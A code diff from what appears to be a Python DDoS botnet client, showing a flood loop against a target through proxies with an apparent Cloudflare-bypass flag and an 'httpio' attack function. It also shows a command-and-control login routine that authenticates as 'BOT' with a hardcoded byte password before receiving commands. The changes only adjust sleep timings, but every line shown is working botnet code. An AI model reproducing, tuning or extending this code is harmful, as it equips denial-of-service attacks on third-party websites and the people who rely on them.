@@ -216,7 +216,7 @@ def run(target, proxies, cfbp):
 def thread(target, proxies, cfbp):
     while True:
         run(target, proxies, cfbp)
-        time.sleep(1)
+        time.sleep(2)
 
 def httpio(target, times, threads, attack_type):
     proxies = []
@@ -402,20 +402,20 @@ def main():
                     c2.send('669787761736865726500'.encode())
                     break
                 while 1:
-                    time.sleep(1)
+                    time.sleep(2)
                     data = c2.recv(1024).decode()
                     if 'Username' in data:
                         c2.send('BOT'.encode())
                         break
                 while 1:
-                    time.sleep(1)
+                    time.sleep(2)
                     data = c2.recv(1024).decode()
                     if 'Password' in data:
                         c2.send('\xff\xff\xff\xff\75'.encode('cp1252'))
                         break
                 break
             except:
-                time.sleep(5)
+                time.sleep(2)
         while 1:
             try:
                 data = c2.recv(1024).decode().strip()
